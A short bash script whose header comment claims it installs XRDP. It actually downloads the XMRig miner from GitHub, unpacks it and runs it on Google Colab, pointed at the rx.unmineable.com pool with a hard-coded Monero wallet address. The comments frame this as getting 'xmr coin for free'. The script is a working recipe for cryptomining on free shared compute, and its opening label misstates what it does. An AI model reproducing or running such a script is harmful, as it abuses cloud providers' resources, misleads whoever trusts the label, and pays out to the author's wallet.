#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:48bwNKTQQxHBxu9kbk6TWGeWRMsuSKQYj3XPuUbAwnwsWkUkj3BKqLH2RPf6bnqXWZRM1tTRX8UYPWPoRDUVW2BzUDiTLML.aMpB21_09#cto1-ag68 -p x
